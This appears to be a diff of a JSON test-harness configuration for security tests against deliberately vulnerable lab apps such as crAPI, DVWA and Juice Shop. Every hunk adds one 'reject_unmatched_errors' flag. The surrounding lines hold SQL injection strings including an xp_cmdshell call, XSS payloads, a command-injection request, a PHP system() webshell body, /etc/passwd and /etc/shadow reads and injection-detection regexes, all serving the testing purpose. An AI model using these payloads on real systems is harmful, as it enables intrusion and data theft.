@@ -319,7 +319,8 @@
             "minimum_dispatches": 1,
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 404, 405, 422]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -371,7 +372,8 @@
             },
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500, 404]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       },
       "tool_contract": {
         "requirements": [
@@ -461,7 +463,8 @@
             "query_regex": ".+=.+",
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 404, 405, 422]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       },
       "tool_contract": {
         "requirements": [
@@ -1849,7 +1852,8 @@
             "minimum_dispatches": 1,
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 404, 405, 422]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       },
       "tool_contract": {
         "requirements": [
@@ -2034,7 +2038,8 @@
             "body_exact": "{\"username\":\"root\",\"password\":\"root\"}",
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       },
       "expected_http_statuses": [400, 401, 404, 405, 409, 422]
     },
@@ -2136,7 +2141,8 @@
             },
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       },
       "expected_http_statuses": [400, 401, 404, 405, 409, 422]
     },
@@ -2210,7 +2216,8 @@
             "minimum_dispatches": 1,
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       },
       "expected_http_statuses": [200, 201, 400, 401, 403, 404, 405, 422, 429, 500],
       "prerequisites": []
@@ -2284,7 +2291,8 @@
             "minimum_dispatches": 2,
             "expected_statuses": [401, 404]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       },
       "expected_http_statuses": [200, 201, 400, 401, 403, 404, 405, 422, 429, 500],
       "prerequisites": [],
@@ -2313,7 +2321,8 @@
             "minimum_dispatches": 3,
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       },
       "expected_http_statuses": [200, 201, 400, 401, 403, 404, 405, 422, 429, 500],
       "prerequisites": []
@@ -2340,7 +2349,8 @@
             "minimum_dispatches": 20,
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       },
       "expected_http_statuses": [200, 201, 400, 401, 403, 404, 405, 422, 429, 500],
       "prerequisites": []
@@ -2367,7 +2377,8 @@
             "minimum_dispatches": 15,
             "payload_class": "credential-stuffing"
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -2405,7 +2416,8 @@
             "minimum_dispatches": 1,
             "payload_class": "rendered-scraping"
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -2438,7 +2450,8 @@
             "minimum_dispatches": 2,
             "payload_class": "browser-contact"
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -2476,7 +2489,8 @@
             "minimum_dispatches": 2,
             "payload_class": "rapid-browser-navigation"
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -2517,7 +2531,8 @@
             "minimum_dispatches": 2,
             "payload_class": "password-guessing"
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -2583,7 +2598,8 @@
             "payload_class": "per-endpoint-throughput",
             "minimum_dispatches": 20
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -2774,7 +2790,8 @@
             "minimum_dispatches": 1,
             "query_regex": "iso=bravo-[0-9]+"
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       },
       "adapter": "dynamic-cache"
     },
@@ -3024,7 +3041,8 @@
             "minimum_dispatches": 1,
             "absent_headers": ["accept-encoding"]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       },
       "adapter": "dynamic-cache"
     },
@@ -3066,7 +3084,8 @@
             "minimum_dispatches": 100,
             "query_regex": "^stampede-[0-9]+-[0-9]+$"
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -3178,7 +3197,8 @@
             "payload_class": "post-bypass-read-control",
             "minimum_dispatches": 2
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -3208,7 +3228,8 @@
               "fastly-client-ip": "(192\\.0\\.2|198\\.51\\.100|203\\.0\\.113)\\.[0-9]+"
             }
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -3274,7 +3295,8 @@
             "payload_class": "cache-expiry-sampling",
             "minimum_dispatches": 10
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -3340,7 +3362,8 @@
             "payload_class": "parallel-load-engine",
             "minimum_dispatches": 20
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -3469,7 +3492,8 @@
             "payload_class": "crapi-parallel-load",
             "minimum_dispatches": 20
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -3527,7 +3551,8 @@
               "connection": "keep-alive"
             }
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -3585,7 +3610,8 @@
               "connection": "close"
             }
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -3612,7 +3638,8 @@
               "user-agent": "challenge-verify"
             }
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -3656,7 +3683,8 @@
             "body_regex": "\"password\"",
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       },
       "prerequisites": ["origin-issued-synthetic-crapi-accounts", "seeded-crapi-objects"],
       "expected_http_statuses": [200, 201, 400, 401, 403, 404, 405, 422, 429, 500]
@@ -3683,7 +3711,8 @@
             "path_regex": "/crapi/identity/api/v2/vehicle/[^/]+/location",
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       },
       "prerequisites": ["origin-issued-synthetic-crapi-accounts", "seeded-crapi-objects"],
       "expected_http_statuses": [200, 201, 400, 401, 403, 404, 405, 422, 429, 500]
@@ -3712,7 +3741,8 @@
             "absent_headers": ["authorization"],
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       },
       "prerequisites": [],
       "expected_http_statuses": [200, 201, 400, 401, 403, 404, 405, 422, 429, 500]
@@ -3740,7 +3770,8 @@
             "body_regex": "\"otp\"\\s*:\\s*\"\\d{4}\"",
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       },
       "prerequisites": ["origin-issued-synthetic-crapi-accounts", "seeded-crapi-objects"],
       "expected_http_statuses": [200, 201, 400, 401, 403, 404, 405, 422, 429, 500]
@@ -3767,7 +3798,8 @@
             "path": "/crapi/workshop/api/mechanic",
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       },
       "prerequisites": ["origin-issued-synthetic-crapi-accounts", "seeded-crapi-objects"],
       "expected_http_statuses": [200, 201, 400, 401, 403, 404, 405, 422, 429, 500]
@@ -3794,7 +3826,8 @@
             "path_regex": "/crapi/community/api/v2/community/posts(?:/recent)?",
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       },
       "prerequisites": ["origin-issued-synthetic-crapi-accounts", "seeded-crapi-objects"],
       "expected_http_statuses": [200, 201, 400, 401, 403, 404, 405, 422, 429, 500]
@@ -3829,7 +3862,8 @@
             "path": "/crapi/identity/api/v2/admin/videos",
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       },
       "prerequisites": ["origin-issued-synthetic-crapi-accounts", "seeded-crapi-objects"],
       "expected_http_statuses": [200, 201, 400, 401, 403, 404, 405, 422, 429, 500]
@@ -3857,7 +3891,8 @@
             "body_regex": "\"(?:status|quantity|credit|price|user_id)\"",
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       },
       "prerequisites": ["origin-issued-synthetic-crapi-accounts", "seeded-crapi-objects"],
       "expected_http_statuses": [200, 201, 400, 401, 403, 404, 405, 422, 429, 500]
@@ -3885,7 +3920,8 @@
             "body_regex": "\"mechanic_api\".*(?:169\\.254|127\\.0\\.0\\.1|localhost|internal)",
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500, 404]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       },
       "prerequisites": ["origin-issued-synthetic-crapi-accounts", "seeded-crapi-objects"],
       "expected_http_statuses": [200, 201, 400, 401, 403, 404, 405, 422, 429, 500]
@@ -3913,7 +3949,8 @@
             "body_regex": "\"mechanic_api\"",
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       },
       "prerequisites": ["origin-issued-synthetic-crapi-accounts", "seeded-crapi-objects"],
       "expected_http_statuses": [200, 201, 400, 401, 403, 404, 405, 422, 429, 500]
@@ -3941,7 +3978,8 @@
             "body_regex": "\\$(?:ne|gt|regex)",
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       },
       "prerequisites": ["origin-issued-synthetic-crapi-accounts", "seeded-crapi-objects"],
       "expected_http_statuses": [200, 201, 400, 401, 403, 404, 405, 422, 429, 500]
@@ -3969,7 +4007,8 @@
             "body_regex": "(?i)(?:OR |UNION |SELECT |SLEEP|--)",
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       },
       "prerequisites": ["origin-issued-synthetic-crapi-accounts", "seeded-crapi-objects"],
       "expected_http_statuses": [200, 201, 400, 401, 403, 404, 405, 422, 429, 500]
@@ -3997,7 +4036,8 @@
             "body_regex": "(?:;|&&|\\||\\$\\(|`)",
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       },
       "prerequisites": ["origin-issued-synthetic-crapi-accounts", "seeded-crapi-objects"],
       "expected_http_statuses": [200, 201, 400, 401, 403, 404, 405, 422, 429, 500]
@@ -4025,7 +4065,8 @@
             "absent_headers": ["authorization"],
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       },
       "prerequisites": [],
       "expected_http_statuses": [200, 201, 400, 401, 403, 404, 405, 422, 429, 500]
@@ -4055,7 +4096,8 @@
             },
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500, 404]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       },
       "prerequisites": ["origin-issued-synthetic-crapi-accounts", "seeded-crapi-objects"],
       "expected_http_statuses": [200, 201, 400, 401, 403, 404, 405, 422, 429, 500]
@@ -4325,7 +4367,8 @@
           "5'; EXEC xp_cmdshell('whoami');--",
           "5' UNION ALL SELECT NULL,CONCAT(username,':',password) FROM users--",
           "-1 OR 17-7=10"
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -4366,7 +4409,8 @@
           "<script>eval(atob('YWxlcnQoMSk='))</script>",
           "<div style=\"width:expression(alert(1))\">",
           "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//"
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -4395,7 +4439,8 @@
               "content-type": "application/json"
             }
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       },
       "prerequisites": ["seeded-dvga-pastes"]
     },
@@ -4424,7 +4469,8 @@
               "content-type": "application/json"
             }
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       },
       "prerequisites": ["seeded-dvga-pastes"]
     },
@@ -4464,7 +4510,8 @@
               "content-type": "application/json"
             }
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       },
       "prerequisites": ["seeded-dvga-pastes"]
     },
@@ -4493,7 +4540,8 @@
               "content-type": "application/json"
             }
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       },
       "prerequisites": ["seeded-dvga-pastes"]
     },
@@ -4522,7 +4570,8 @@
               "content-type": "application/json"
             }
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       },
       "prerequisites": ["seeded-dvga-pastes"]
     },
@@ -4551,7 +4600,8 @@
               "content-type": "application/json"
             }
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       },
       "prerequisites": ["seeded-dvga-pastes"]
     },
@@ -4580,7 +4630,8 @@
               "content-type": "application/json"
             }
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       },
       "prerequisites": ["seeded-dvga-pastes"]
     },
@@ -4609,7 +4660,8 @@
               "content-type": "application/json"
             }
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       },
       "prerequisites": ["seeded-dvga-pastes"]
     },
@@ -4707,7 +4759,8 @@
             },
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -4832,7 +4885,8 @@
             "body_exact": "ip=127.0.0.1%3B+echo+%24%28whoami%29&Submit=Submit",
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -4865,7 +4919,8 @@
             },
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -4995,7 +5050,8 @@
             "body_exact": "<?php system(\"id\"); ?>",
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -5060,7 +5116,8 @@
             },
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -5167,7 +5224,8 @@
             },
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500, 404]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -5256,7 +5314,8 @@
             },
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -5399,7 +5458,8 @@
             },
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -5598,7 +5658,8 @@
             },
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -5686,7 +5747,8 @@
             },
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -5803,7 +5865,8 @@
             },
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -5832,7 +5895,8 @@
             "body_exact": "Generate=Generate",
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -5938,7 +6002,8 @@
             "absent_headers": ["cookie"],
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -6109,7 +6174,8 @@
             },
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -6171,7 +6237,8 @@
             "body_exact": "{\"email\":\"jim@juice-sh.op'--\",\"password\":\"x\"}",
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -6397,7 +6464,8 @@
             },
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -6580,7 +6648,8 @@
             "minimum_dispatches": 1,
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -6749,7 +6818,8 @@
             "minimum_dispatches": 1,
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -6948,7 +7018,8 @@
             },
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -7121,7 +7192,8 @@
             "minimum_dispatches": 1,
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -7261,7 +7333,8 @@
             "minimum_dispatches": 1,
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 404, 405, 422]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -7518,7 +7591,8 @@
             },
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -7718,7 +7792,8 @@
             "minimum_dispatches": 1,
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500, 404]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -7801,7 +7876,8 @@
             },
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500, 404]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -9280,7 +9356,8 @@
             "absent_headers": ["authorization"],
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 404, 405, 422]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -9357,7 +9434,8 @@
             "body_regex": "(?i)(UNION|AND|OR|\\x27|SLEEP)",
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500, 404]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       },
       "tool_contract": {
         "requirements": [
@@ -9475,7 +9553,8 @@
               "cookie": "x-mud-user=mud-attacker-01"
             }
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -9646,7 +9725,8 @@
               "cookie": "x-mud-user=mud-attacker-01"
             }
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -10783,7 +10863,8 @@
               "x-mud-user": "mud-attacker-01"
             }
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -11106,7 +11187,8 @@
             "minimum_dispatches": 1,
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 404, 405, 422]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       },
       "tool_contract": {
         "requirements": [
@@ -11266,7 +11348,8 @@
             "minimum_dispatches": 2,
             "query_regex": "username=admin&password=.+&Login=Login"
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       },
       "tool_contract": {
         "requirements": [
@@ -11439,7 +11522,8 @@
             "payload_class": "display-simulation-inventory",
             "minimum_dispatches": 1
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -11634,7 +11718,8 @@
             "payload_class": "session-cookie-header-observation",
             "minimum_dispatches": 1
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       },
       "tool_contract": {
         "requirements": [
@@ -11845,7 +11930,8 @@
             "minimum_dispatches": 1,
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 404, 405, 422]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       },
       "tool_contract": {
         "requirements": [
@@ -12013,7 +12099,8 @@
             "payload_class": "counter-receipt-read",
             "minimum_dispatches": 1
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       },
       "tool_contract": {
         "requirements": [
@@ -12081,7 +12168,8 @@
             "minimum_dispatches": 1,
             "body_exact": "txtName=MITRE&mtxMessage=<h1>Defaced by T1491</h1>&btnSign=Sign+Guestbook"
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -12140,7 +12228,8 @@
             "payload_class": "zap-spider-navigation",
             "minimum_dispatches": 1
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -12199,7 +12288,8 @@
             "payload_class": "zap-spider-navigation",
             "minimum_dispatches": 1
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -12276,7 +12366,8 @@
               "user-agent": "(?i)nikto"
             }
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       },
       "tool_contract": {
         "requirements": [
@@ -12343,7 +12434,8 @@
               "user-agent": ".+"
             }
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       },
       "tool_contract": {
         "requirements": [
@@ -12449,7 +12541,8 @@
             },
             "body_regex": "(?i)(SELECT|UNION|AND|OR|SLEEP|\\x27)"
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       },
       "tool_contract": {
         "requirements": [
@@ -13716,7 +13809,8 @@
             "minimum_dispatches": 1,
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 404, 405, 422]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       },
       "tool_contract": {
         "requirements": [
@@ -13799,7 +13893,8 @@
             "minimum_dispatches": 1,
             "query_regex": ".+=.+"
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       },
       "tool_contract": {
         "requirements": [
@@ -13922,7 +14017,8 @@
             "minimum_dispatches": 1,
             "query_regex": ".+=.+"
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       },
       "tool_contract": {
         "requirements": [
@@ -14012,7 +14108,8 @@
             "payload_class": "bounded-01-concurrency-ramp",
             "minimum_dispatches": 10
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       },
       "adapter": "bounded-workload",
       "workload_contract": {
@@ -14126,7 +14223,8 @@
             "payload_class": "per-endpoint-throughput",
             "minimum_dispatches": 100
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -14206,7 +14304,8 @@
             "payload_class": "bounded-03-sustained-load",
             "minimum_dispatches": 10
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       },
       "adapter": "bounded-workload",
       "workload_contract": {
@@ -14260,7 +14359,8 @@
               "connection": "close"
             }
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -14304,7 +14404,8 @@
               "q": "<script>alert(1)</script>"
             }
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -14387,7 +14488,8 @@
             "payload_class": "per-endpoint-latency-sampling",
             "minimum_dispatches": 20
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -14467,7 +14569,8 @@
             "payload_class": "bounded-07-self-profile-under-load",
             "minimum_dispatches": 10
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       },
       "adapter": "bounded-workload",
       "workload_contract": {
@@ -14564,7 +14667,8 @@
             "payload_class": "bounded-08-ephemeral-port-stress",
             "minimum_dispatches": 10
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       },
       "adapter": "bounded-workload",
       "workload_contract": {
@@ -14614,7 +14718,8 @@
             "minimum_dispatches": 1,
             "query_regex": "(?i)(UNION|%27|OR)"
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -14673,7 +14778,8 @@
             "payload_class": "per-endpoint-throughput",
             "minimum_dispatches": 20
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -14749,7 +14855,8 @@
             "payload_class": "constant-rate-mixed-path",
             "minimum_dispatches": 1
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -14832,7 +14939,8 @@
             "payload_class": "per-endpoint-throughput",
             "minimum_dispatches": 100
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -15085,7 +15193,8 @@
             "payload_class": "directory-wordlist-probe",
             "minimum_dispatches": 1
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       },
       "tool_contract": {
         "requirements": [
@@ -15322,7 +15431,8 @@
             "payload_class": "directory-wordlist-probe",
             "minimum_dispatches": 1
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       },
       "tool_contract": {
         "requirements": [
@@ -15356,7 +15466,8 @@
             "payload_class": "resolved-authorized-domain-probe",
             "minimum_dispatches": 2
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -15837,7 +15948,8 @@
             "minimum_dispatches": 1,
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 404, 405, 422]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -15989,7 +16101,8 @@
             "minimum_dispatches": 1,
             "query_regex": "^q='\\ OR\\ 1=1\\-\\-><script>alert\\(1\\)</script>;cat\\ /etc/passwd;\\.\\./\\.\\./etc/shadow$"
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -16035,7 +16148,8 @@
             },
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -16123,7 +16237,8 @@
             },
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -16415,7 +16530,8 @@
             },
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 404, 405, 422]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -16504,7 +16620,8 @@
             },
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -16655,7 +16772,8 @@
             "absent_headers": ["authorization"],
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -16828,7 +16946,8 @@
             },
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500, 404]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -16971,7 +17090,8 @@
             },
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -17042,7 +17162,8 @@
             },
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -17070,7 +17191,8 @@
             },
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 500]
           }
-        ]
+        ],
+        "reject_unmatched_errors": true
       }
     },
     {
@@ -17447,7 +17569,8 @@
